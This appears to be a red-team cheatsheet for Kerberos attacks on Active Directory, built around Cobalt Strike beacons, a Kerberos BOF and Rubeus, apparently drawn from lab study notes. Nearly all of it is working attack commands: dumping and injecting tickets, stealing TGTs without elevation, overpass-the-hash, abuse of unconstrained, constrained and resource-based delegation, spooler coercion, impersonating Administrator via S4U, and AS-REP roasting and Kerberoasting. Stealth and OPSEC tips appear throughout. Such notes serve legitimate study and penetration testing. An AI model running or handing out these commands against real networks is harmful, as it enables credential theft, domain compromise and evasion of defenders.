# Kerbeus- BOF

# krb_BOF — Cobalt Strike Cheatsheet

> All commands run via `krb_ <subcommand> <args>` through the krb_ aggressor script on an active beacon.
> 

---

## Recon & Listing

### `krb_triage`

List all tickets in table format.

```
krb_triage
krb_triage /luid:3ea8
krb_triage /user:Administrator
krb_triage /service:krbtgt
```

> Filters: `/luid` `/user` `/service` `/client`
> 

---

### `krb_ klist`

Verbose ticket listing.

```
krb_klist
krb_klist /service:krbtgt
krb_klist /user:Administrator /luid:3ea8
```

---

### `krb_ describe`

Decode and inspect a base64 ticket blob without making any auth calls.

```
krb_describe /ticket:doIF8DCCBey...
```

> Good for validating stolen tickets before injecting.
> 

---

## Ticket Operations

### `krb_ asktgt`

Request a TGT.

```
# Password — aes256, opsec mode, inject on success
krb_asktgt /user:Admin /password:QWErty /enctype:aes256 /opsec /ptt

# RC4 hash
krb_asktgt /user:svc_sql /rc4:HASH /domain:corp.local

# AES256 hash, no PAC, inject
krb_asktgt /user:Admin /aes256:HASH /nopac /ptt

# No preauth account
krb_asktgt /user:pre_user /nopreauth /dc:dc01.corp.local
```

> Prefer `/aes256 /opsec` for stealth. `/ptt` injects immediately into the current session.
> 

---

### `krb_ asktgs`

Request a service ticket (TGS).

```
# CIFS ticket, inject
krb_asktgs /ticket:doIF... /service:CIFS/dc.corp.local /ptt

# AES256, opsec
krb_asktgs /ticket:doIF... /service:HOST/comp.corp.local /enctype:aes256 /opsec

# Cross-domain
krb_asktgs /ticket:TGT /service:HOST/comp.sub.local /targetdomain:sub.local /ptt
```

---

### `krb_ dump`

Dump tickets from LSA memory.

```
krb_dump
krb_dump /luid:3ea8
krb_dump /service:krbtgt
krb_dump /user:Administrator
```

> Output is base64 — feed directly into `/ticket:` params on other commands.
> 

---

### `krb_ ptt`

Inject a ticket into a logon session.

```
# Current session
krb_ptt /ticket:doIF8DCCBey...

# Target specific LUID
krb_ptt /ticket:doIF... /luid:3ea8
```

---

### `krb_ tgtdeleg`

Steal a usable TGT without elevation by abusing the Kerberos GSS-API.

```
# Current user (no elevation needed)
krb_tgtdeleg

# Target a specific SPN
krb_tgtdeleg /target:CIFS/dc.corp.local
```

> Works as any domain user — no admin rights required.
> 

---

### `krb_ purge`

Purge tickets from a logon session.

```
krb_purge
krb_purge /luid:3ea8
```

> Always purge before injecting new tickets to avoid conflicts.
> 

---

### `krb_ renew`

Renew a TGT before it expires.

```
krb_renew /ticket:doIF... /ptt
krb_renew /ticket:doIF... /dc:dc01.corp.local
```

---

### `krb_ hash`

Compute RC4, AES128, and AES256 hashes from a plaintext password.

```
krb_hash /password:!Q@W3e4r
krb_hash /password:P4ss /user:svc_sql /domain:corp.local
```

> Pipe output into `krb_ asktgt /aes256:HASH /opsec` for overpass-the-hash.
> 

---

# Unconstrained Delegation

## Enumeration

```bash
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
```

## Waiting for users to auth and giving away TGTs

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap
```

## Killing the rubeus job

```bash
beacon> jobs
[*] Jobs JID PID  Description
         0   2468 .NET assembly
beacon> jobkill 0
[+] job 0 completed
```

# Constrained Delegation

### With Protocol Transition

## Enumeration

```bash
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
```

### finding if protocol transition is allowed(T) or not(F)

```bash
[Convert]::ToBoolean("UAC Value from ldapquery" -band 16777216)
```

## Preparation

```powershell
krb_s4u /impersonateuser:administrator /service:cifs/lon-fs-1 /ticket:delegated_account$TGT
```

<aside>
💡

krb_s4u does s4uself along with s4u2proxy so we get the service ticket for cifs/lon-fs-1

</aside>

### Without Protocol Transition

If our `lon-ws-1$` is not having `TRUSTED_TO_AUTH_FOR_DELEGATION` flag set. we get the situation where there’s protocol transition disabled. ;)

So here we don’t have the liberty to use any user in the `/impersonateuser` parameter we can do S4U only for those users whose `/tgs` we’ve or are cached in the memory.

```bash
krb_triage
#to get the available tickets in memory
```

## Enumeration

```bash
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

## Preparation

The procedure for this is to use the `/tgs` parameter in Rubeus, rather than `/impersonateuser`.

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap
```

# Service-Name Substituition in ticket

## Preparation

```bash
krb_s4u /ticket:[delegated_Account_tgt] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
```

# Coercing a machine for S4U2Self (paired with unconstrained delegation mostly, ***but can work anywhere if you’ve a computer’s TGT***)

## Preparation

 We could therefore monitor for tickets on lon-ws-1:

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:COERCED_TARGET /nowrap
```

## Exploitation

The remote authentication trigger should be run as a standard domain user in a medium-integrity context.

```bash
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe target_we_Want_to_auth_with_us controlled_computer_account
```

<aside>
💡

the obtained ticket is computer account ticket we cant use it for jump command cuz it’s not local admin on itself remotely.

what this trick does basically is takes it’s computer’s tgt and asks for a tgs for user we wnt to impersonate on it’s own service.

</aside>

The workaround to compromise any computer once you have its TGT is to use the S4U2self protocol to obtain a usable service ticket for a different (impersonated) user. Use the captured tgt for tgs to self:

```bash
krb_s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket: /nowrap
```

# Resource-Based Constrained Delegation

## Enumeration

An adversary can potentially abuse RBCD to gain access to a computer when **both conditions** are satisfied:

- They have **write access** to the computer object’s `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
- They control another principal that has an **SPN (Service Principal Name)** configured.

**WriteProperty**

```bash
PS C:\Users\Attacker> ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1
PS C:\Users\Attacker> $Cred = Get-Credential CONTOSO\rsteel
PS C:\Users\Attacker> Get-DomainComputer -Server 10.10.120.1 -Credential $Cred | Get-DomainObjectAcl -Server 10.10.120.1 -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty' } | select ObjectDN,SecurityIdentifier
```

In the output we get the SID’s let’s translate them

```bash
Get-ADGroup -Filter 'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"' -Server 10.10.120.1 -Credential $Cred
```

**Accounts with SPNs**

- Other computer accounts can be used if you have elevated privileges to SYSTEM anywhere, as every computer has a default set of SPNs such as HOST,
RestrictedKrbHost, TERMSRV, and WSMAN.
- If you don’t have any of the above, a last ditch attempt can be to add your own computer object to the domain. Active Directory contains an attribute called `msDS-MachineAccountQuota` which controls the number of computer accounts that a user is allowed to create in the domain (yes, even standard domain users). This is 10 by default. Tools such as [StandIn](https://github.com/FuzzySecurity/StandIn) can create these fake computer objects via LDAP.

## Preparation

Get the already set accounts for RBCD, we need to keep their record for OPSEC as we’ll add our record here cuz we dont control `lon-ws-1`.

```bash
PS C:\Users\Attacker> Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name        PrincipalsAllowedToDelegateToAccount
----        ------------------------------------
LON-DC-1    {}
LON-WS-1    {}
LON-FS-1    {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
LON-WKSTN-1 {}
LON-WKSTN-2 {}
```

To add a computer that we have SYSTEM on, such as lon-wkstn-1, we can do:

```bash
PS C:\Users\Attacker> $ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> $wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
```

## Exploitation

get the tgt of `lon-wkstn-1` that we control and added to the backend service’s list.

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

perform s4u:

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap
```

creating another session using the latest ticket we got:

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==
```

```bash
beacon> steal_token 4568
```

We can then remove the entry by running Set-ADComputer again with just the original account.

```bash
PS C:\Users\Attacker> Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
PS C:\Users\Attacker> Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

Name     PrincipalsAllowedToDelegateToAccount
----     ------------------------------------
LON-FS-1 {CN=LON-WS-1,OU=Member Servers,DC=contoso,DC=com}
```

# AS-REP ROASTING

## Enumeration

find the asreproastable accounts:

```bash
ldapsearch "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName userAccountControl
```

## Exploitation

roasting specific account for OPSEC:

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:administrator /format:hashcat /nowrap
```

# KERBEROASTING

## Enumeration

finding kerberoastable accounts:

```bash
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
```

## Exploitation

Targeting specific spns:

```bash
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap
```

---

## Common Chains

### Overpass-the-hash (aes256, opsec)

```
krb_hash /password:P4ss /user:Admin /domain:corp.local
krb_asktgt /user:Admin /aes256:<HASH> /opsec /ptt
```

### Dump → describe → inject

```
krb_dump /service:krbtgt
krb_describe /ticket:<BASE64>
krb_purge
krb_ptt /ticket:<BASE64>
```

### Kerberoast with existing TGT

```
krb_dump /service:krbtgt
krb_kerberoasting /spn:MSSQLSvc/db.corp.local /ticket:<BASE64>
# crack offline → hashcat -m 13100
```

### S4U full chain (delegate → pivot protocol)

```
krb_tgtdeleg /target:CIFS/dc.corp.local
krb_s4u /ticket:<TGT_BASE64> /impersonateuser:Administrator /service:host/comp.corp.local /altservice:cifs,http,ldap /ptt
```